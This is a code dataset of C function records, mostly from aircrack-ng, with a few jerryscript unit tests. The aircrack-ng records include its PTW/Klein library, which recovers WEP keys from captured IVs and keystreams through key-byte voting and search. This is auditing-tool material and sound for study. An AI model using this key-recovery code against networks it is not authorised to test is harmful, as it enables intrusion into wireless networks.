{"docstring": "/*\n * Guess the values for sigma_i\n * ivlen - how long was the iv (is used differently in original klein attack)\n * iv - IV which was used for this packet\n * keystream - keystream recovered\n * result - buffer for the values of sigma_i\n * kb - how many keybytes should be guessed\n */\n", "func_signal": "static void guesskeybytes(\n\tint ivlen, uint8_t * iv, uint8_t * keystream, uint8_t * result, int kb)", "code": "{\n\tREQUIRE(iv != NULL);\n\tREQUIRE(keystream != NULL);\n\tREQUIRE(result != NULL);\n\n\tuint32_t state[n];\n\tuint8_t j = 0;\n\tuint8_t tmp;\n\tint i;\n\tint jj = ivlen;\n\tuint8_t ii;\n\tuint8_t s = 0;\n\tmemcpy(state, &rc4initial, sizeof(rc4initial));\n\tfor (i = 0; i < ivlen; i++)\n\t{\n\t\tj += state[i] + iv[i];\n\t\ttmp = state[i];\n\t\tstate[i] = state[j];\n\t\tstate[j] = tmp;\n\t}\n\tfor (i = 0; i < kb; i++)\n\t{\n\t\ttmp = jj - keystream[jj - 1];\n\t\tii = 0;\n\t\twhile (tmp != state[ii])\n\t\t{\n\t\t\tii++;\n\t\t}\n\t\ts += state[jj];\n\t\tii -= (j + s);\n\t\tresult[i] = ii;\n\t\tjj++;\n\t}\n\treturn;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// For sorting\n", "func_signal": "static int comparesorthelper(const void * ina, const void * inb)", "code": "{\n\tREQUIRE(ina != NULL);\n\tREQUIRE(inb != NULL);\n\n\tsorthelper * a = (sorthelper *) ina;\n\tsorthelper * b = (sorthelper *) inb;\n\treturn a->distance - b->distance;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Is a guessed key correct?\n */\n", "func_signal": "static int correct(PTW_attackstate * state, uint8_t * key, int keylen)", "code": "{\n\tREQUIRE(state != NULL);\n\tREQUIRE(key != NULL && keylen > 0);\n\n\tint i;\n\tint k;\n\n\t// We need at least 3 sessions to be somehow certain\n\tif (state->sessions_collected < 3)\n\t{\n\t\treturn 0;\n\t}\n\n\ttried++;\n\n\tk = rand_u32() % (state->sessions_collected - 10);\n\tfor (i = k; i < k + 10; i++)\n\t{\n\t\tif (!state->rc4test(key,\n\t\t\t\t\t\t\tkeylen,\n\t\t\t\t\t\t\tstate->sessions[i].iv,\n\t\t\t\t\t\t\tstate->sessions[i].keystream))\n\t\t\treturn 0;\n\t}\n\treturn 1;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/* Return -1 if it's not an hex value and return its value when it's a hex value\n */\n", "func_signal": "int hexCharToInt(unsigned char c)", "code": "{\n\tstatic int table_created = 0;\n\tstatic int table[256];\n\n\tint i;\n\n\tif (table_created == 0)\n\t{\n\t\t/*\n\t\t * It may seem a bit long to calculate the table\n\t\t * but character position depend on the charset used\n\t\t * Example: EBCDIC\n\t\t * but it's only done once and then conversion will be really fast\n\t\t */\n\t\tfor (i = 0; i < 256; i++)\n\t\t{\n\n\t\t\tswitch ((unsigned char) i)\n\t\t\t{\n\t\t\t\tcase '0':\n\t\t\t\t\ttable[i] = 0;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '1':\n\t\t\t\t\ttable[i] = 1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '2':\n\t\t\t\t\ttable[i] = 2;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '3':\n\t\t\t\t\ttable[i] = 3;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '4':\n\t\t\t\t\ttable[i] = 4;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '5':\n\t\t\t\t\ttable[i] = 5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '6':\n\t\t\t\t\ttable[i] = 6;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '7':\n\t\t\t\t\ttable[i] = 7;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '8':\n\t\t\t\t\ttable[i] = 8;\n\t\t\t\t\tbreak;\n\t\t\t\tcase '9':\n\t\t\t\t\ttable[i] = 9;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'A':\n\t\t\t\tcase 'a':\n\t\t\t\t\ttable[i] = 10;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'B':\n\t\t\t\tcase 'b':\n\t\t\t\t\ttable[i] = 11;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'C':\n\t\t\t\tcase 'c':\n\t\t\t\t\ttable[i] = 12;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'D':\n\t\t\t\tcase 'd':\n\t\t\t\t\ttable[i] = 13;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'E':\n\t\t\t\tcase 'e':\n\t\t\t\t\ttable[i] = 14;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 'F':\n\t\t\t\tcase 'f':\n\t\t\t\t\ttable[i] = 15;\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\ttable[i] = -1;\n\t\t\t}\n\t\t}\n\n\t\ttable_created = 1;\n\t}\n\n\treturn table[c];\n}", "path": "aircrack-ng/lib/libac/support/common.c", "commit_date": "2020-11-01 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// RC4 key setup\n", "func_signal": "static void rc4init(uint8_t * key, int keylen, rc4state * state)", "code": "{\n\tREQUIRE(key != NULL);\n\tREQUIRE(keylen > 0 && keylen < INT_MAX);\n\tREQUIRE(state != NULL);\n\n\tint i;\n\tunsigned char j;\n\tuint8_t tmp;\n\tint idx = 0;\n\tmemcpy(state->s, &rc4initial, sizeof(rc4initial));\n\tj = 0;\n\tfor (i = 0; i < n; i++)\n\t{\n\t\t/*  this should be:\n\t\t\tj = (j + state->s[i] + key[i % keylen]) % n;\n\t\t\tbut as \"j\" is declared as unsigned char and n equals 256,\n\t\t\twe can \"optimize\" it\n\t\t*/\n\t\tj = (j + state->s[i] + key[idx]);\n\t\tif (++idx == keylen) idx = 0;\n\t\ttmp = state->s[i];\n\t\tstate->s[i] = state->s[j];\n\t\tstate->s[j] = tmp;\n\t}\n\tstate->i = 0;\n\tstate->j = 0;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Do the actual computation of the key\n */\n", "func_signal": "static int doComputation(PTW_attackstate * state,\n\t\t\t\t\t\t uint8_t * key,\n\t\t\t\t\t\t int keylen,\n\t\t\t\t\t\t PTW_tableentry table[][n],\n\t\t\t\t\t\t sorthelper * sh2,\n\t\t\t\t\t\t int * strongbytes,\n\t\t\t\t\t\t int keylimit,\n\t\t\t\t\t\t int * bf,\n\t\t\t\t\t\t int validchars[][n])", "code": "{\n\tint i, j;\n\tint choices[KEYHSBYTES];\n\tint prod;\n\tint fixat;\n\tint fixvalue;\n\n\tif (!opt.is_quiet)\n\t\tmemcpy(keytable, table, sizeof(PTW_tableentry) * n * keylen);\n\n\tfor (i = 0; i < keylen; i++)\n\t{\n\t\tif (strongbytes[i] == 1)\n\t\t{\n\t\t\tchoices[i] = i;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tchoices[i] = 1;\n\t\t}\n\t}\n\ti = 0;\n\tprod = 0;\n\tfixat = -1;\n\tfixvalue = 0;\n\tmax_tries = keylimit;\n\n\twhile (prod < keylimit)\n\t{\n\t\tif (doRound(table,\n\t\t\t\t\t0,\n\t\t\t\t\tfixat,\n\t\t\t\t\tfixvalue,\n\t\t\t\t\tchoices,\n\t\t\t\t\tkey,\n\t\t\t\t\tkeylen,\n\t\t\t\t\tstate,\n\t\t\t\t\t0,\n\t\t\t\t\tstrongbytes,\n\t\t\t\t\tbf,\n\t\t\t\t\tvalidchars)\n\t\t\t== 1)\n\t\t{\n\t\t\t// printf(\"hit with %d choices\\n\", prod);\n\t\t\tif (!opt.is_quiet)\n\t\t\t\tshow_wep_stats(keylen - 1, 1, keytable, choices, depth, tried);\n\t\t\treturn 1;\n\t\t}\n\t\twhile ((i < keylen * (n - 1)) && ((strongbytes[sh2[i].keybyte] == 1)\n\t\t\t\t\t\t\t\t\t\t  || (bf[sh2[i].keybyte] == 1)))\n\t\t{\n\t\t\ti++;\n\t\t}\n\t\tif (i >= (keylen * (n - 1)))\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\tchoices[sh2[i].keybyte]++;\n\t\tfixat = sh2[i].keybyte;\n\t\t// printf(\"choices[%d] is now %d\\n\", sh2[i].keybyte,\n\t\t// choices[sh2[i].keybyte]);\n\t\tfixvalue = sh2[i].value;\n\t\tprod = 1;\n\t\tfor (j = 0; j < keylen; j++)\n\t\t{\n\t\t\tprod *= choices[j];\n\t\t\tif (bf[j] == 1)\n\t\t\t{\n\t\t\t\tprod *= n;\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\tdo {\n\t\t\ti++;\n\t\t} while (strongbytes[sh2[i].keybyte] == 1);\n\t\t*/\n\t\ti++;\n\n\t\tif (!opt.is_quiet)\n\t\t\tshow_wep_stats(keylen - 1, 0, keytable, choices, depth, tried);\n\t}\n\tif (!opt.is_quiet)\n\t\tshow_wep_stats(keylen - 1, 1, keytable, choices, depth, tried);\n\treturn 0;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Guess a single keybyte\n */\n", "func_signal": "static int doRound(PTW_tableentry sortedtable[][n],\n\t\t\t\t   int keybyte,\n\t\t\t\t   int fixat,\n\t\t\t\t   uint8_t fixvalue,\n\t\t\t\t   int * searchborders,\n\t\t\t\t   uint8_t * key,\n\t\t\t\t   int keylen,\n\t\t\t\t   PTW_attackstate * state,\n\t\t\t\t   uint8_t sum,\n\t\t\t\t   int * strongbytes,\n\t\t\t\t   int * bf,\n\t\t\t\t   int validchars[][n])", "code": "{\n\tint i;\n\tuint8_t tmp;\n\n\tif (!opt.is_quiet && keybyte < 4)\n\t\tshow_wep_stats(keylen - 1, 0, keytable, searchborders, depth, tried);\n\tif (keybyte > 0)\n\t{\n\t\tif (!validchars[keybyte - 1][key[keybyte - 1]])\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\t}\n\tif (keybyte == keylen)\n\t{\n\t\treturn correct(state, key, keylen);\n\t}\n\telse if (bf[keybyte] == 1)\n\t{\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tkey[keybyte] = i;\n\t\t\tif (doRound(sortedtable,\n\t\t\t\t\t\tkeybyte + 1,\n\t\t\t\t\t\tfixat,\n\t\t\t\t\t\tfixvalue,\n\t\t\t\t\t\tsearchborders,\n\t\t\t\t\t\tkey,\n\t\t\t\t\t\tkeylen,\n\t\t\t\t\t\tstate,\n\t\t\t\t\t\tsum + i % n,\n\t\t\t\t\t\tstrongbytes,\n\t\t\t\t\t\tbf,\n\t\t\t\t\t\tvalidchars))\n\t\t\t{\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\t}\n\telse if (keybyte == fixat)\n\t{\n\t\tkey[keybyte] = fixvalue - sum;\n\t\treturn doRound(sortedtable,\n\t\t\t\t\t   keybyte + 1,\n\t\t\t\t\t   fixat,\n\t\t\t\t\t   fixvalue,\n\t\t\t\t\t   searchborders,\n\t\t\t\t\t   key,\n\t\t\t\t\t   keylen,\n\t\t\t\t\t   state,\n\t\t\t\t\t   fixvalue,\n\t\t\t\t\t   strongbytes,\n\t\t\t\t\t   bf,\n\t\t\t\t\t   validchars);\n\t}\n\telse if (strongbytes[keybyte] == 1)\n\t{\n\t\t// printf(\"assuming byte %d to be strong\\n\", keybyte);\n\t\ttmp = 3 + keybyte;\n\t\tfor (i = keybyte - 1; i >= 1; i--)\n\t\t{\n\t\t\ttmp += 3 + key[i] + i;\n\t\t\tkey[keybyte] = n - tmp;\n\t\t\tif (doRound(sortedtable,\n\t\t\t\t\t\tkeybyte + 1,\n\t\t\t\t\t\tfixat,\n\t\t\t\t\t\tfixvalue,\n\t\t\t\t\t\tsearchborders,\n\t\t\t\t\t\tkey,\n\t\t\t\t\t\tkeylen,\n\t\t\t\t\t\tstate,\n\t\t\t\t\t\t(n - tmp + sum) % n,\n\t\t\t\t\t\tstrongbytes,\n\t\t\t\t\t\tbf,\n\t\t\t\t\t\tvalidchars)\n\t\t\t\t== 1)\n\t\t\t{\n\t\t\t\tprintf(\"hit with strongbyte for keybyte %d\\n\", keybyte);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\tREQUIRE(searchborders != NULL);\n\t\tREQUIRE(keybyte >= 0);\n\n\t\tfor (i = 0; i < searchborders[keybyte]; i++)\n\t\t{\n\t\t\tkey[keybyte] = sortedtable[keybyte][i].b - sum;\n\t\t\tif (!opt.is_quiet)\n\t\t\t{\n\t\t\t\tdepth[keybyte] = i;\n\t\t\t\tkeytable[keybyte][i].b = key[keybyte];\n\t\t\t}\n\t\t\tif (doRound(sortedtable,\n\t\t\t\t\t\tkeybyte + 1,\n\t\t\t\t\t\tfixat,\n\t\t\t\t\t\tfixvalue,\n\t\t\t\t\t\tsearchborders,\n\t\t\t\t\t\tkey,\n\t\t\t\t\t\tkeylen,\n\t\t\t\t\t\tstate,\n\t\t\t\t\t\tsortedtable[keybyte][i].b,\n\t\t\t\t\t\tstrongbytes,\n\t\t\t\t\t\tbf,\n\t\t\t\t\t\tvalidchars))\n\t\t\t{\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\t}\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Free an allocated attackstate\n */\n", "func_signal": "void PTW_freeattackstate(PTW_attackstate * state)", "code": "{\n\tfree(state->allsessions);\n\tfree(state);\n\treturn;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// Shameless copy from tshark/wireshark?\n", "func_signal": "static void hexDump(char * desc, void * addr, int len)", "code": "{\n\tint i;\n\tu_int8_t buff[17];\n\tu_int8_t * pc = (u_int8_t *) addr;\n\n\t// Output description if given.\n\tif (desc != NULL) printf(\"%s:\\n\", desc);\n\n\t// Process every byte in the data.\n\tfor (i = 0; i < len; i++)\n\t{\n\t\t// Multiple of 16 means new line (with line offset).\n\t\tif ((i % 16) == 0)\n\t\t{\n\t\t\t// Just don't print ASCII for the zeroth line.\n\t\t\tif (i != 0) printf(\"  %s\\n\", buff);\n\n\t\t\t// Output the offset in Hex.\n\t\t\tprintf(\"  %04x \", i);\n\t\t}\n\n\t\t// Now the hex code for the specific character.\n\t\tprintf(\" %02x\", pc[i]);\n\n\t\t// And store a printable ASCII character for later.\n\t\tif ((pc[i] < 0x20) || (pc[i] > 0x7e))\n\t\t\tbuff[i % 16] = '.';\n\t\telse\n\t\t\tbuff[i % 16] = pc[i];\n\t\tbuff[(i % 16) + 1] = '\\0';\n\t}\n\n\t// Pad out last line if not exactly 16 characters.\n\twhile ((i % 16) != 0)\n\t{\n\t\tprintf(\"   \");\n\t\ti++;\n\t}\n\n\t// And print the final ASCII bit.\n\tprintf(\"  %s\\n\", buff);\n}", "path": "aircrack-ng/src/airventriloquist-ng/airventriloquist-ng.c", "commit_date": "2020-10-31 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Allocate a new attackstate\n */\n", "func_signal": "PTW_attackstate * PTW_newattackstate(void)", "code": "{\n\tint i, k;\n\tPTW_attackstate * state = NULL;\n\tstate = malloc(sizeof(PTW_attackstate));\n\tALLEGE(state != NULL);\n\tmemset(state, 0, sizeof(PTW_attackstate));\n\tfor (i = 0; i < PTW_KEYHSBYTES; i++)\n\t{\n\t\tfor (k = 0; k < n; k++)\n\t\t{\n\t\t\tstate->table[i][k].b = k;\n\t\t}\n\t}\n\tstate->allsessions = malloc(4096 * sizeof(PTW_session));\n\tALLEGE(state->allsessions != NULL);\n\tstate->allsessions_size = 4096;\n\n\treturn state;\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/*\n * Guess which key bytes could be strong and start actual computation of the key\n */\n", "func_signal": "int PTW_computeKey(PTW_attackstate * state,\n\t\t\t\t   uint8_t * keybuf,\n\t\t\t\t   int keylen,\n\t\t\t\t   int testlimit,\n\t\t\t\t   int * bf,\n\t\t\t\t   int validchars[][n],\n\t\t\t\t   int attacks)", "code": "{\n\tREQUIRE(state != NULL);\n\n\tint strongbytes[KEYHSBYTES];\n\tdouble normal[KEYHSBYTES];\n\tdouble ausreisser[KEYHSBYTES];\n\tdoublesorthelper helper[KEYHSBYTES];\n\tint simple, onestrong, twostrong;\n\tint i, j;\n#ifdef USE_AMD64_RC4_OPTIMIZED\n\t/*\n\t * The 64-bit SSE2-optimized rc4test() requires this buffer to be\n\t * aligned at 3 bytes.\n\t */\n\tuint8_t fullkeybuf_unaligned[PTW_KSBYTES + 13] __attribute__((aligned(16)));\n\tuint8_t * fullkeybuf = &fullkeybuf_unaligned[13];\n#else\n\tuint8_t fullkeybuf[PTW_KSBYTES];\n#endif\n\tuint8_t guessbuf[PTW_KSBYTES];\n\tsorthelper(*sh)[n - 1];\n\tPTW_tableentry(*table)[n] = alloca(sizeof(PTW_tableentry) * n * keylen);\n\tALLEGE(table != NULL);\n\n#ifdef USE_AMD64_RC4_OPTIMIZED\n\t/*\n\t * sse2-optimized rc4test() function for amd64 only works\n\t * for keylen == 5 or keylen == 13\n\t */\n\tif (keylen == 5 || keylen == 13)\n\t\tstate->rc4test = rc4test_amd64_sse2;\n\telse\n#endif\n\t\tstate->rc4test = rc4test;\n\n\ttried = 0;\n\tsh = NULL;\n\n\tif (!(attacks & NO_KLEIN))\n\t{\n\t\t// Try the original klein attack first\n\t\tfor (i = 0; i < keylen; i++)\n\t\t{\n\t\t\tmemset(&table[i][0], 0, sizeof(PTW_tableentry) * n);\n\t\t\tfor (j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\ttable[i][j].b = j;\n\t\t\t}\n\t\t\tfor (j = 0; j < state->packets_collected; j++)\n\t\t\t{\n\t\t\t\t// fullkeybuf[0] = state->allsessions[j].iv[0];\n\t\t\t\tmemcpy(\n\t\t\t\t\tfullkeybuf, state->allsessions[j].iv, 3 * sizeof(uint8_t));\n\t\t\t\tguesskeybytes(i + 3,\n\t\t\t\t\t\t\t  fullkeybuf,\n\t\t\t\t\t\t\t  state->allsessions[j].keystream,\n\t\t\t\t\t\t\t  guessbuf,\n\t\t\t\t\t\t\t  1);\n\t\t\t\ttable[i][guessbuf[0]].votes += state->allsessions[j].weight;\n\t\t\t}\n\t\t\tqsort(&table[i][0], n, sizeof(PTW_tableentry), &compare);\n\t\t\tj = 0;\n\t\t\twhile (!validchars[i][table[i][j].b])\n\t\t\t{\n\t\t\t\tj++;\n\t\t\t}\n\t\t\t// printf(\"guessing i = %d, b = %d\\n\", i, table[0][0].b);\n\t\t\tfullkeybuf[i + 3] = table[i][j].b;\n\t\t}\n\t\tif (correct(state, &fullkeybuf[3], keylen))\n\t\t{\n\t\t\tmemcpy(keybuf, &fullkeybuf[3], keylen * sizeof(uint8_t));\n\t\t\t// printf(\"hit without correction\\n\");\n\t\t\treturn (FAILURE);\n\t\t}\n\t}\n\n\tif (!(attacks & NO_PTW))\n\t{\n\t\tmemcpy(table, state->table, sizeof(PTW_tableentry) * n * keylen);\n\n\t\tonestrong = (testlimit / 10) * 2;\n\t\ttwostrong = (testlimit / 10) * 1;\n\t\tsimple = testlimit - onestrong - twostrong;\n\n\t\t// now, sort the table\n\t\tfor (i = 0; i < keylen; i++)\n\t\t{\n\t\t\tqsort(&table[i][0], n, sizeof(PTW_tableentry), &compare);\n\t\t\tstrongbytes[i] = 0;\n\t\t}\n\n\t\tsh = alloca(sizeof(sorthelper) * (n - 1) * keylen);\n\t\tALLEGE(sh != NULL);\n\n\t\tfor (i = 0; i < keylen; i++)\n\t\t{\n\t\t\tfor (j = 1; j < n; j++)\n\t\t\t{\n\t\t\t\tsh[i][j - 1].distance = table[i][0].votes - table[i][j].votes;\n\t\t\t\tsh[i][j - 1].value = table[i][j].b;\n\t\t\t\tsh[i][j - 1].keybyte = i;\n\t\t\t}\n\t\t}\n\t\tqsort(sh, (n - 1) * keylen, sizeof(sorthelper), &comparesorthelper);\n\n\t\tif (doComputation(state,\n\t\t\t\t\t\t  keybuf,\n\t\t\t\t\t\t  keylen,\n\t\t\t\t\t\t  table,\n\t\t\t\t\t\t  (sorthelper *) sh,\n\t\t\t\t\t\t  strongbytes,\n\t\t\t\t\t\t  simple,\n\t\t\t\t\t\t  bf,\n\t\t\t\t\t\t  validchars))\n\t\t{\n\t\t\treturn (FAILURE);\n\t\t}\n\n\t\t// Now one strong byte\n\t\tgetdrv(state->table, keylen, normal, ausreisser);\n\t\tfor (i = 0; i < keylen - 1; i++)\n\t\t{\n\t\t\thelper[i].keybyte = i + 1;\n\t\t\thelper[i].difference = normal[i + 1] - ausreisser[i + 1];\n\t\t}\n\t\tqsort(helper,\n\t\t\t  keylen - 1,\n\t\t\t  sizeof(doublesorthelper),\n\t\t\t  &comparedoublesorthelper);\n\t\t// do not use bf-bytes as strongbytes\n\t\ti = 0;\n\t\twhile (bf[helper[i].keybyte] == 1)\n\t\t{\n\t\t\ti++;\n\t\t}\n\t\tstrongbytes[helper[i].keybyte] = 1;\n\t\tif (doComputation(state,\n\t\t\t\t\t\t  keybuf,\n\t\t\t\t\t\t  keylen,\n\t\t\t\t\t\t  table,\n\t\t\t\t\t\t  (sorthelper *) sh,\n\t\t\t\t\t\t  strongbytes,\n\t\t\t\t\t\t  onestrong,\n\t\t\t\t\t\t  bf,\n\t\t\t\t\t\t  validchars))\n\t\t{\n\t\t\treturn (FAILURE);\n\t\t}\n\n\t\t// two strong bytes\n\t\ti++;\n\t\twhile (bf[helper[i].keybyte] == 1)\n\t\t{\n\t\t\ti++;\n\t\t}\n\t\tstrongbytes[helper[i].keybyte] = 1;\n\t\tif (doComputation(state,\n\t\t\t\t\t\t  keybuf,\n\t\t\t\t\t\t  keylen,\n\t\t\t\t\t\t  table,\n\t\t\t\t\t\t  (sorthelper *) sh,\n\t\t\t\t\t\t  strongbytes,\n\t\t\t\t\t\t  twostrong,\n\t\t\t\t\t\t  bf,\n\t\t\t\t\t\t  validchars))\n\t\t{\n\t\t\treturn (FAILURE);\n\t\t}\n\t}\n\treturn (SUCCESS);\n}", "path": "aircrack-ng/lib/ptw/aircrack-ptw-lib.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/* Return the version number */\n", "func_signal": "char * getVersion(const char * progname,\n\t\t\t\t  const unsigned int maj,\n\t\t\t\t  const unsigned int min,\n\t\t\t\t  const unsigned int submin,\n\t\t\t\t  const char * rev,\n\t\t\t\t  const unsigned int beta,\n\t\t\t\t  const unsigned int rc)", "code": "{\n\tif (progname == NULL || progname[0] == 0)\n\t{\n\t\tfprintf(stderr, \"Invalid program name, cannot be NULL or empty\\n\");\n\t\texit(1);\n\t}\n\tif (rc != 0 && beta != 0)\n\t{\n\t\tfprintf(stderr, \"RC and beta cannot be both used\\n\");\n\t\texit(1);\n\t}\n\n\t// Calculate and allocate buffer\n\tsize_t len = 100 + strlen(progname);\n\tif (rev)\n\t{\n\t\tlen += strlen(rev);\n\t}\n\tchar * ret = (char *) calloc(1, len);\n\tif (ret == NULL)\n\t{\n\t\tperror(\"calloc()\");\n\t\texit(1);\n\t}\n\n\t// Major, minor version\n\tsnprintf(ret, len, \"%s %u.%u\", progname, maj, min);\n\n\t// Sub-minor\n\tif (submin > 0)\n\t{\n\t\tsnprintf(ret + strlen(ret), len - strlen(ret), \".%u\", submin);\n\t}\n\n\t// Release candidate ...\n\tif (rc > 0)\n\t{\n\t\tsnprintf(ret + strlen(ret), len - strlen(ret), \" rc%u\", rc);\n\t}\n\telse if (beta > 0)\n\t{ // ... Or beta\n\t\tsnprintf(ret + strlen(ret), len - strlen(ret), \" beta%u\", beta);\n\t}\n\n\t// Add revision if it comes from subversion or git\n\tif (rev)\n\t{\n\t\tchar * tmp = strdup(rev);\n\t\tALLEGE(tmp != NULL);\n\n\t\tchar * sep = strstr(tmp, \"_\");\n\t\tif (sep)\n\t\t{\n\t\t\t++sep;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsep = \"\";\n\t\t}\n\n\t\tchar * search = strstr(sep, \"rev-\");\n\t\tif (search)\n\t\t{\n\t\t\tsearch[3] = ' ';\n\t\t}\n\n\t\tsnprintf(\n\t\t\tret + strlen(ret), len - strlen(ret), \" %s\", search ? search : sep);\n\t\tfree(tmp);\n\t}\n\n\t// Shorten buffer if possible\n\tchar * r_ret = realloc(ret, strlen(ret) + 1);\n\treturn (r_ret) ? r_ret : ret;\n}", "path": "aircrack-ng/lib/libac/support/common.c", "commit_date": "2020-11-01 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "// Read a line of characters inputted by the user\n", "func_signal": "int readLine(char line[], int maxlength)", "code": "{\n\tint c;\n\tint i = -1;\n\n\tdo\n\t{\n\t\t// Read char\n\t\tc = getchar();\n\n\t\tif (c == EOF) c = '\\0';\n\n\t\tline[++i] = (char) c;\n\n\t\tif (line[i] == '\\n') break;\n\t\tif (line[i] == '\\r') break;\n\t\tif (line[i] == '\\0') break;\n\t} while (i + 1 < maxlength);\n\t// Stop at 'Enter' key pressed or EOF or max number of char read\n\n\t// Return current size\n\treturn i;\n}", "path": "aircrack-ng/lib/libac/support/common.c", "commit_date": "2020-11-01 00:00:00", "repo_name": "aircrack-ng/aircrack-ng", "stars": 4658, "license": "gpl-2.0", "language": "c", "size": 17165}
{"docstring": "/* handle_require */\n", "func_signal": "static void\nassert_number (jerry_value_t js_value, double expected_result)", "code": "{\n  TEST_ASSERT (!jerry_value_is_error (js_value));\n  TEST_ASSERT (jerry_get_number_value (js_value) == expected_result);\n}", "path": "jerryscript/tests/unit-ext/module/jerry-module-test.c", "commit_date": "2019-08-06 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_handle_scope_val */\n", "func_signal": "int\nmain (void)", "code": "{\n  jerry_init (JERRY_INIT_EMPTY);\n\n  native_free_cb_call_count = 0;\n  test_handle_scope_val ();\n\n  jerry_gc (JERRY_GC_PRESSURE_LOW);\n  TEST_ASSERT (native_free_cb_call_count == handle_count);\n\n  jerry_cleanup ();\n}", "path": "jerryscript/tests/unit-ext/test-ext-handle-scope-handle-prelist.c", "commit_date": "2019-07-17 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_context_data1_new */\n", "func_signal": "static void\ntest_context_data1_free (void *user_data_p)", "code": "{\n  test_context_data1_free_called = true;\n  TEST_ASSERT ((*(const char **) user_data_p) == string1);\n  TEST_ASSERT (!test_context_data1_finalize_called);\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
{"docstring": "/* test_context_data1_free */\n", "func_signal": "static void\ntest_context_data1_finalize (void *user_data_p)", "code": "{\n  TEST_ASSERT (test_context_data1_free_called);\n  TEST_ASSERT (!test_context_data1_finalize_called);\n  TEST_ASSERT ((*(const char **) user_data_p) == string1);\n  test_context_data1_finalize_called = true;\n}", "path": "jerryscript/tests/unit-core/test-context-data.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "jerryscript-project/jerryscript", "stars": 6792, "license": "apache-2.0", "language": "c", "size": 61832}
